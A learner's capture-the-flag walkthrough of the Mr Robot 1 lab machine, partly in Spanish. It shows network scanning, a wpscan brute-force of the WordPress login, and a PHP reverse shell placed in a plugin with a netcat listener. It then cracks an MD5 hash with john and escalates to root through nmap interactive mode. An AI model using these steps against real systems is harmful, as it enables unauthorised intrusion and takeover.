# Mr robot1 # 

As we do allways first we make a directory for work on the route; 

*cds@cds:~/Documentos/Workspace/Virtual machines/pentesting/mrrobot1$*

now we scan with 
sudo arp-scan 192.168.100.0/24 , and we discover the IP of the vicim machine in 192.168.100.28 , lets make a second scan

*sudo nmap -p- -sS -sV -sC -Pn -n -vvv -min-rate 5000 192.168.100.28  -oN mrrobot*

The guy of the video uses another comand . He does not use arp-scan

he uses *netdiscover -r 192.168.100.0/24*

![[netscan-r.png]]
and this is what we got, we have the mac too, very intresting

we are going to the **192.168.100.28 on the browser** to see what we have it there, and inspect the *SOURCE CODE* because the port 80 is open 
![[APACHE 1.png]]
And its running an apache server.
We dont see nothing on the apache server, but the guy of who im guiding to resolve this have an interesting thing for search scripts on nmap 

**ls /usr/share/nmap/scripts/http-en* **
and the route is in *usr/share/nmap/scripts/http-enum.nse*
![[Cibersecurity/Virtual Machines/Vuln Hub Machines/Mrrobot1/IMAGES/scriptsnmap1.png]]
And now he is sending it with the next comand
**nmap --script=http-enum.nse -p 80 192.168.100.28 -oN nmap-http-enum.txt**
![[SCRIPTNMAP2.png]]

So, this is what we obtain
![[mrrobotscriptnmap.png]]
We have many interesting things, but we are going to go to the ***/wp-login.php*** link and the ***/robots.txt*** link

![[robotstxt.png]]

we get this (the frist flag or key of 3), now we are going to download it 
***wget http://192.168.100.28/key1-of-3.txt***
![[wget1key.png]]
Now we are going to read it 
***cat key-1-of-3.txt***   
073403c8a58a1f80d943455fb30724b9

And download the other 
***wget http://192.168.100.28/fsocity.dic***
its a dict and we see that have a lot of words
less fsocity.dic(podemos ver a nuestro antojo todas las lineas) 

wc -l fsocity.dic (cuenta las lineas del archivo) *858160 fsocity.dic*
***858160 lines***
Now we are going to use a comand and we are going to se if there are some repeated words

***unique -inp=fsocity.dic fsoc.txt***

![[reducirpalabras.png]]

Because of this machine is about a serie called "MR robot" we are going to test the possible users of the loggin account in wordpres with the cast  characters of the series

in another  archive alled "users.txt" we are going to put inside "elliot" and "angela"

we are going to watch more about this website with a tool called

"wpscan"

![[wpscan.png]]

and this will be the comand to attack, we have much more options so we can search which are intresting

wpscan --url http://192.168.100.28 --output wpscan-reportwp.txt -P fsoc.txt -U usuarios.txt --max-threads 20 --password-attack wp-login
![[wpscanattak.png]]

this is the result 
I dont kno why angela looks like this, but this is the password.
![[Captura de pantalla_2023-07-14_02-20-24.png]]

The next step , when we are logged in on wordpress with the account of elliot, we are going to plugins , and we are going to put some code in the hello doly plug in
(we will try to get a reverse shell on php) , this is the url of the git repository
https://github.com/pentestmonkey/php-reverse-shell

![[helloodoly.png]]

now we copy and paste the code inside the plugin

![[phpreverseshell.png]]

Lets edit the $ip variable and $port, with our ip and the port that we want

![[editip.png]]

Now lets listen on netcat with
-nc nlvp 443 (in the port that we select previously)

![[ncnlvp.png]]

when we activate the plugin we obtain the reverse shell 

![[activate.png]]


we have acces to the pc but we are nor root 

![[daemonrs.png]]
we see watch  in the folder
cat etc/passwd 
and we watch in the home/robot folder, wha can we do if we are not users, we can execute some archives as you can see thats our permissons

![[homerobot.png]]
And now we have the key but only the user robot can open the archive, but seem like the pass of robot is there, and we can see it (ITS A HASH OF THE PASWD on md5)
![[key2casi 1.png]]

we can identify the type of hash with 
hash-indentifier  (I'ts not necesary put the hash as I did it on the example)
#hash-indentifier 
![[hash1.png]]
and in this image you can see is asking me the hash
![[hash2.png]]
Now its telling me that is a possible md5 hash
![[possiblehash.png]]

now we are decoding it with john the ripper
#john 

first we use john --list-formats 

and select the correct one

1st: *intent john --format=Raw-MD5 --wordlist=fsoc.txt  --robothash.txt *
no goals
2nd: *john --format=Raw-MD5 --wordlist=fsoc.txt  robothash.txt --rules*

select the format --format
select a wordlist (??) --wordlist  NO IDEA SOBRE ESO DE WORDLIST
--robothash.txt   es el archivo con el hash
--rules aparentemente usa palabras con mayusculas y cosas que no estan en nuestra lista

![[jonrules.png]]

we did it

But when we try to get in we have problems , we need to make a terminal with python

python -c 'import pty;pty.spawn("/bin/bash")'

#pythonterminal
![[suterminal.png]]

now we can put the password and read the second key

![[segundallave.png]]

The guy used this comand for search folders of the user root that had "extra permisions" or permisions to other users.

 no entiendo lo de -print 2> /dev/null

**find /* -user root -perm -4000 -print 2> /dev/null**

![[finddev.png]]

as you can see the user robot have permisions to execute nmap of this folder 
*/usr/local/bin/nmap* . We are going to do so
--------------------------------------------------------------
We can use interactive mode in this version of nmap with the  comand
nmap --interactive

![[nmapinteractivo.png]]


Now this guy gets a root with the comand  
**!sh**  on the interactive nmap mode... a shell with root permisions
![[rootwithnmap.png]]

and finally we get the third key !! 

![[3key.png]]